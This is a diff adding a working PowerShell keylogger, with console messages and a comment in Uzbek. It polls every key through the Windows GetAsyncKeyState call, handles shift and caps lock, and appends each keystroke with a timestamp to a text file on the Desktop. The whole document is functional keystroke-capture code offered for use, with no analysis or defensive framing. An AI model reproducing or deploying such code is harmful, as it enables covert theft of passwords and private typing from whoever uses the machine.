@@ -1,0 +1,58 @@
+$desktopPath = [Environment]::GetFolderPath("Desktop")
+$logFile = Join-Path $desktopPath "key_log.txt"
+
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int vKey);
+}
+"@
+
+$keyMap = @{
+    65='a';66='b';67='c';68='d';69='e';70='f';71='g';72='h';73='i';74='j';75='k';76='l';77='m';
+    78='n';79='o';80='p';81='q';82='r';83='s';84='t';85='u';86='v';87='w';88='x';89='y';90='z';
+    48='0';49='1';50='2';51='3';52='4';53='5';54='6';55='7';56='8';57='9';
+    32=' ';13="[ENTER]";8="[BACK]";9="[TAB]";27="[ESC]";
+    186=';';187='=';188=',';189='-';190='.';191='/';192='`';219='[';220='\';221=']';222="'"
+}
+
+$shiftMap = @{
+    48=')';49='!';50='@';51='#';52='$';53='%';54='^';55='&';56='*';57='(';
+    186=':';187='+';188='<';189='_';190='>';191='?';192='~';219='{';220='|';221='}';222='"'
+}
+
+$prev = @{}
+foreach($k in $keyMap.Keys){ $prev[$k] = $false }
+
+Write-Host "Keylogger ishlayapti → $logFile" -ForegroundColor Cyan
+Write-Host "To'xtatish uchun Ctrl+C bosing`n"
+
+while($true){
+    $shift = ([Win32]::GetAsyncKeyState(0xA0) -band 0x8000) -or ([Win32]::GetAsyncKeyState(0xA1) -band 0x8000)
+    $caps  = ([Win32]::GetAsyncKeyState(0x14) -band 1)
+
+    foreach($code in $keyMap.Keys){
+        if([Win32]::GetAsyncKeyState($code) -band 0x8000){
+            if(-not $prev[$code]){
+                $c = $keyMap[$code]
+
+                if($code -ge 65 -and $code -le 90){
+                    $c = if($shift -xor $caps){ $c.ToUpper() } else { $c.ToLower() }
+                }
+                if($shift -and $shiftMap.ContainsKey($code)){
+                    $c = $shiftMap[$code]
+                }
+
+                # MANA SHU QATORNI O‘ZGARTIRDIK – ENDI XATO CHIQTMAYDI
+                $line = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + " → " + $c
+                $line | Out-File -FilePath $logFile -Append -Encoding UTF8
+            }
+            $prev[$code] = $true
+        }else{
+            $prev[$code] = $false
+        }
+    }
+    Start-Sleep -Milliseconds 8
+}
